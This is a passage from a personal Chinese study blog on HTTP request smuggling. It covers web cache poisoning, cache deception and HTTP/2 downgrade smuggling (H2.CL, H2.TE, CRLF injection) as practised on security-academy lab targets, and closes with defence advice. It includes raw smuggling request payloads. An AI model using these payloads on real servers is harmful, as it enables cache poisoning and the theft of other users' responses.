+<li>web缓存投毒<br>那么看看这道利用HTTP请求走私进行Web缓存投毒的例题<br>如果前端基础设施的任何部分对内容进行缓存（通常是为了提升性能），那么攻击者就可能通过发送站外重定向响应来污染缓存<br>先用简单payload测试是哪种漏洞 CL.TE<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/60.png"><br>先测试最基础的重定向和漏洞<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/61.png"><br>好的 302了<br>那么看看自己定义Host<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/62.png"><br>添加好了 发第二个包去试看看<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/63.png"><br>确实是可以哈 那么就来自己确定文件了<br>之后用他缓存的文件信息 30秒改缓存 那么就抓住时间 教学这里是27秒 </li>
+<li>Web缓存欺骗<br>这个 我想想 和前面偷走前端重命名的标头那个很相似 不过这个不是吞走用户的请求头 是利用缓存从而查看关键字<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/64.png"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/65.png"><br>这里是看到API不会马上刷掉<br>和上一道题一样  抓紧在静态资源更新时去发送攻击请求</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /my-account HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+<p>这里不知道是什么原因找不到静态资源 很奇怪</p>
+<h3 id="HTTP2走私"><a href="#HTTP2走私" class="headerlink" title="HTTP2走私"></a>HTTP2走私</h3><ol>
+<li>HTTP&#x2F;2 格式核心<br>HTTP&#x2F;1.1 是<strong>文本协议</strong>(ASCII 字符，用换行符分隔）<br>HTTP&#x2F;2 是<strong>二进制协议</strong> HTTP&#x2F;2 不再像 HTTP&#x2F;1.1 那样把整个请求扔过去。它把数据切成一个个微小的<strong>帧 (Frame)</strong></li>
+</ol>
+<ul>
+<li><strong>帧 (Frame)</strong>：通信的最小单位。每个帧都有头部，说明了它是属于哪个流（Stream ID）、它的类型（Type）以及长度（Length）。</li>
+<li><strong>类型</strong>：常见的有 <code>HEADERS</code> 帧（放 HTTP 头）、<code>DATA</code> 帧（放 POST body）、<code>SETTINGS</code> 帧等。</li>
+</ul>
+<ol start="2">
+<li>多路复用<br><strong>HTTP&#x2F;1.1</strong>：第一个请求没处理完，第二个请求就得放在TCP缓存区等着<br><strong>HTTP&#x2F;2</strong>：同一个 TCP 连接里，可以同时跑很多个请求。它们被打散成“帧”，乱序发送，然后在接收端根据 <strong>Stream ID</strong> 重新组装起来。</li>
+<li>漏洞呢？<br>在纯 HTTP&#x2F;2 环境下（客户端-&gt;H2-&gt;服务端），走私很难发生，因为 H2 的帧长度是非常精准的，没有歧义。也就是说几乎不太可能找到走私了  但是….<br>现实世界的架构通常是</li>
+</ol>
+<ul>
+<li><strong>前端</strong>：支持 HTTP&#x2F;2，负责高性能连接。</li>
+<li><strong>后端</strong>：很多老旧应用或框架只支持 HTTP&#x2F;1.1。</li>
+<li><strong>中间过程</strong>：前端接收 H2 数据流，将其<strong>转换（降级</strong>为 HTTP&#x2F;1.1 文本格式发给后端。<br>漏洞显而易见 会出现在中间过程到后端的过程中 那么<br>是否可以想到前面的http1的漏洞问题<br>举个例子<br>前端使用的是<strong>帧的长度</strong>来判断请求结束<br>后端使用的是CL</li>
+<li>攻击者在 HTTP&#x2F;2 的 HEADERS 帧中，故意注入一个 <code>content-length</code> 头（H2 协议本身不需要这个头，但允许存在）。</li>
+<li>H2 代理将请求转换成 H1 发送给后端。</li>
+<li>后端看到 CL 头，提前截断请求。</li>
+<li>剩下的 Data 帧数据被留在 TCP 管道中，变成了下一个请求的开头。<br>例题<br>H2.CL<br>利用404检测后端类型</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: qqqqqqqqq.web-security-academy.net</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">GET /frewfes HTTP/1.1</span><br><span class="line">x: x</span><br></pre></td></tr></table></figure>
+<p>然后去发第二个包 404了<br>证明后端确实只收到了x&#x3D;1<br>接下来就和上面的TE.CL一模一样了<br>利用重定向去跳转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: qqqqqqqq.web-security-academy.net</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">GET resources/js HTTP/1.1</span><br><span class="line">CL： 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+<p>进去攻击模块 一直去反复发送即可<br>和http1.1的模式是完全一样的<br>H2.TE与上面相同 只是后端停在TE特有的0分块上面 例题可以参考之前的CL.TE靶场<br>4. CRLF injection<br>基于前面两个基础的靶场 可能网站采取措施防止基本的 H2.CL 或 H2.TE 攻击，例如验证<code>content-length</code>或剥离任何<code>transfer-encoding</code>标头<br>那么我们也许可以通过其他的标头和对应的值来在里面插入<code>content-length</code>或剥<code>transfer-encoding</code>标头<br>例如<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/75.png"><br>之后再摆上对应漏洞的payload（这里是后端TE）<br>然后发送第二个包 404了证明这样子添加后也可被后端识别到TE标头 接下来就是和之前一样了<br>主要了解一下这个方法<br>后面的靶场除了H2以外 与前面没有任何区别</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>打了那么多靶场之后 我以攻击者的视角讲一下我眼中的防御</p>
+<ol>
+<li>对于H1 保证使用前端后端的请求结束位置没有差异 也就是说前端后端使用的“定位机制”一样 然后对于特殊的TE.TE漏洞 做严格验证 不能通过混淆标头就绕过</li>
+<li>对于H2 其实本身是完全没法利用的了 可以说是一步到位了 其中的漏洞几乎都是来自于没有端到端的使用 从而发送到后端的时候导致了HTTP协议的降级 另外对于CLRF的使用 对于请求头的使用（包含TE或者是CL）关于换行符 空格 冒号全部拒绝</li>
+<li>对于服务器 如果在处理请求时触发服务器级异常，则默认丢弃连接</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://xiexie-qiuligao.github.io">xiexie</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://xiexie-qiuligao.github.io/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">http://xiexie-qiuligao.github.io/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://xiexie-qiuligao.github.io" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0task/">学习task</a></div><div class="post-share"><div class="social-share" data-image="/img/1.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">反序列化</div></div><div class="info-2"><div class="info-item-1">一般的反序列化入口    方法名 触发时机 &#x2F; 定义 触发方式极简示例    __construct 创建对象时初始化 new User();   __destruct 销毁对象时 (如脚本结束) $obj = null; 或 脚本执行完毕   __sleep 序列化前 serialize($obj);   __wakeup 反序列化后 unserialize($str);   __serialize 序列化时 (PHP 7.4+) serialize($obj);   __unserialize 反序列化时 (PHP 7.4+) unserialize($str);   __...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-30</div><div class="info-item-2">反序列化</div></div><div class="info-2"><div class="info-item-1">一般的反序列化入口    方法名 触发时机 &#x2F; 定义 触发方式极简示例    __construct 创建对象时初始化 new User();   __destruct 销毁对象时 (如脚本结束) $obj = null; 或 脚本执行完毕   __sleep 序列化前 serialize($obj);   __wakeup 反序列化后 unserialize($str);   __serialize 序列化时 (PHP 7.4+) serialize($obj);   __unserialize 反序列化时 (PHP 7.4+) unserialize($str);   __...</div></div></div></a><a class="pagination-related" href="/2025/01/07/upload%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/" title="upload靶场重做"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-07</div><div class="info-item-2">upload靶场重做</div></div><div class="info-2"><div class="info-item-1"> 前端验证 可以禁用js 或者是先改后缀 然后抓包改 检查content-type 抓包改 在apache文件里面看哪些后缀会被作为php文件解析 php php3 phtml .htaccess 是Apache 服务器专属的 “分布式配置文件”（Nginx&#x2F; IIS 服务器不支持) 作用是 “局部配置”：不用修改 Apache 的主配置文件，只需把.htaccess 放在某个目录下，就能对这个目录及所有子目录生效；修改后不用重启 Apache 服务器，保存就生效那么这里的攻击就是先上传恶意的.htaccess 文件修改目录解析规则，再上传伪装成普通文件的恶意脚本，让服务器把这...</div></div></div></a><a class="pagination-related" href="/2026/01/12/RCE/" title="RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-12</div><div class="info-item-2">RCE</div></div><div class="info-2"><div class="info-item-1">靶场 eval执行  12345678&lt;?php    if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123;        eval($_REQUEST[&#x27;cmd&#x27;]);    &#125;	else&#123;        highlight_file(__FILE__);    &#125;?&gt; 最简单的漏洞题 知识点直接在wp里面找 但几乎都知道 $_REQUEST 是一个超全局变量，它包含了通过 GET、POST 或 COOKIE 方法传递的参数。 eval() 函数会将传递进来的 cmd 参数的值作为 PHP ...</div></div></div></a><a class="pagination-related" href="/2025/01/06/XXE/" title="XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-06</div><div class="info-item-2">XXE</div></div><div class="info-2"><div class="info-item-1">什么是XXEXXE(XML External Entity Injection) 全称为 XML 外部实体注入 XML注入 在极客2025里面做过的 用svg标签来得到 当然太局限局限了 继续往下看 XML 文件可以通过 “外部实体”（DOCTYPE 声明中的 ENTITY）引用外部资源，但如果服务器的 XML 解析器未禁用外部实体加载，攻击者就能构造恶意 XML 内容，诱导解析器执行非法操作（比如读取服务器本地文件、访问内部网络等）。 基础知识 DTD 简单说简单说，DTD 是 XML 的 “格式说明书”：规定 XML 里能出现哪些元素、属性；定义元素的嵌套顺序、次数；统一不同 XML...</div></div></div></a><a class="pagination-related" href="/2026/01/27/LFI/" title="LFI"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-27</div><div class="info-item-2">LFI</div></div><div class="info-2"><div class="info-item-1"> 先写靶场  直接用get访问即可，这里对文件没有任何限制。 用upload那里学到的00截断来做，如果你要传php文件的话，可以不用管，因为他是加上后缀.php（其实我这里没有看懂这个防御方式），如果要穿其他文件的话，就在末尾用00截断 从后往前数四个，如果是.php就直接错，不是的话就直接访问，绕过的方式就很多了，可以大写绕过。也可以加点绕过。 ·addslashes()函数，addslashes()是 PHP 内置的字符串转义函数，核心作用是：在字符串中的 ** 单引号（&#39;）、双引号（&quot;）、反斜线（\）、NUL（NULL 空字符）** 这四类 “预定义特殊字符” ...</div></div></div></a><a class="pagination-related" href="/2026/01/07/SSTI%E9%81%97%E6%BC%8F%E7%9A%84%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E9%9D%B6%E5%9C%BAwp/" title="SSTI遗漏的知识以及靶场wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-07</div><div class="info-item-2">SSTI遗漏的知识以及靶场wp</div></div><div class="info-2"><div class="info-item-1">漏洞成因Flask模板注入漏洞通常是因为开发人员直接将用户输入作为模板内容进行渲染，而不是使用模板变量。例如，使用render_template_string函数时，如果用户输入被直接嵌入模板字符串中，而没有经过适当的处理，攻击者就可以注入模板代码，从而执行任意代码。 为什么不能直接用__import__(‘os’).system(‘xxx’)？ Jinja2模板引擎为了安全考虑，Jinja2 主动“阉割”了危险入口，_import__ 不在模板可访问的命名空间里。但是，Jinja2模板语法提供了执行一些表达式的能力，可以“绕到它”。 （Jinja2 是一个文本模板引擎，它能把”模板”和...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xiexie</div><div class="author-info-description">我的个人学习博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiexie-qiuligao"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">HTTP请求走私的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BD%93%E7%9A%84%E7%BB%93%E6%9D%9F%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">消息体的结束位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">HTTP 请求走私攻击类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">判断漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%B5%B0%E7%A7%81%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">HTTP走私利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP2%E8%B5%B0%E7%A7%81"><span class="toc-number">6.</span> <span class="toc-text">HTTP2走私</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">防御</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="HTTP 请求走私">HTTP 请求走私</a><time datetime="2026-02-01T13:00:00.000Z" title="发表于 2026-02-01 21:00:00">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">反序列化</a><time datetime="2026-01-30T12:00:00.000Z" title="发表于 2026-01-30 20:00:00">2026-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/LFI/" title="LFI">LFI</a><time datetime="2026-01-27T15:00:00.000Z" title="发表于 2026-01-27 23:00:00">2026-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/scarlet-ctf/" title="无标题">无标题</a><time datetime="2026-01-21T06:39:10.606Z" title="发表于 2026-01-21 14:39:10">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/14/SSRF%20and%20CSRF/" title="SSRF&amp;CSRF">SSRF&amp;CSRF</a><time datetime="2026-01-14T13:00:00.000Z" title="发表于 2026-01-14 21:00:00">2026-01-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xiexie</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="/js/tw_cn.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
